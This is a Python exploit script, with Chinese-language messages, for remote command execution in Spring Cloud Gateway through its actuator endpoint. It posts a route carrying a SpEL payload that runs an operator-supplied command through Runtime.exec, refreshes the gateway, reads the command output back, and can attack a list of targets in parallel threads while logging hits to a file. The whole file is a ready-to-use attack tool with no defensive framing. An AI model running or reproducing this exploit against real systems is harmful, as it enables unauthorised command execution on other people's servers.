# -*- coding: utf-8 -*-
# @Time    : 2022/3/3 23:04
# @Author  : AD钙奶
import argparse
import base64
import json
import random
import ssl
import string
import sys
import requests
import threadpool

try:
	requests.packages.urllib3.disable_warnings()
	_create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
	pass
else:
	ssl._create_default_https_context = _create_unverified_https_context


def _poc(url,command=''):
	if command == '':
		command = 'id'
	id = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
	url1 = url + f'/actuator/gateway/routes/{id}'
	url2 = url + '/actuator/gateway/refresh'
	url3 = url + f'/actuator/gateway/routes/{id}'
	headers = {
		'Accept-Encoding': 'gzip, deflate',
		'Accept': '*/*',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
		'Connection': 'close',
		'Content-Type': 'application/json'
	}
	payload = {
		"id": "code",
		"filters": [{
			"name": "AddResponseHeader",
			"args": {
				"name": "Result",
				"value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"" + command + "\").getInputStream()))}"
			}
		}],
		"uri": "http://example.com",
		"order": 0}
	data1 = {
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'zh-CN,zh;q=0.9',
		'Connection': 'close',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '0'
	}
	try:
		res1 = requests.post(url=url1, headers=headers, data=json.dumps(payload, ensure_ascii = False), verify=False, timeout=5)
		if res1.status_code == 201:
			info1 = f"[*] {url} 添加{id}恶意的路由成功"
			save_vuln(info1)
			print(info1)
			res2 = requests.post(url=url2, headers=headers, data=data1, verify=False, timeout=5)
			if res2.status_code == 200:
				info2 = f"[*] {url} 刷新网关路由成功"
				save_vuln(info2)
				print(info2)
				res3 = requests.get(url=url3, headers=headers, verify=False, timeout=5)
				if res3.status_code == 200:
					get_response = res3.json()
					info3 = f"[*] {url} 命令执行结果：" + get_response['filters'][0].split("'")[1]
					save_vuln(info3)
					print(info3)
	except Exception as e:
		print(e)
		pass


def init_command_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--target', help='请输入目标地址', metavar='')
	parser.add_argument('-f', '--file', help="请输入批量的文件名称", metavar='')
	parser.add_argument('-x', '--command', default='whoami', help="请输入执行的命令", metavar='')
	parser.add_argument('-t', '--threads', default=50, help="请输入执行的命令", metavar='')
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit(1)
	args = parser.parse_args()
	return args


def get_file(file):
	with open(file, 'r', encoding='UTF-8') as f:
		_urls = f.readlines()
	urls = [url.strip() for url in _urls if url and url.strip()]
	return urls


def save_vuln(info):
	vuln = info + '\n'
	with open('vuln.txt', 'a', encoding='UTF-8') as f:
		f.write(vuln)


def main():
	args = init_command_args()
	url = args.target
	file = args.file
	thread = args.threads
	command = args.command
	if file:
		url = get_file(file)
		pool = threadpool.ThreadPool(int(thread))
		res = threadpool.makeRequests(_poc, url)
		[pool.putRequest(req) for req in res]
		pool.wait()
	elif url:
		_poc(url, command)


if __name__ == '__main__':
	main()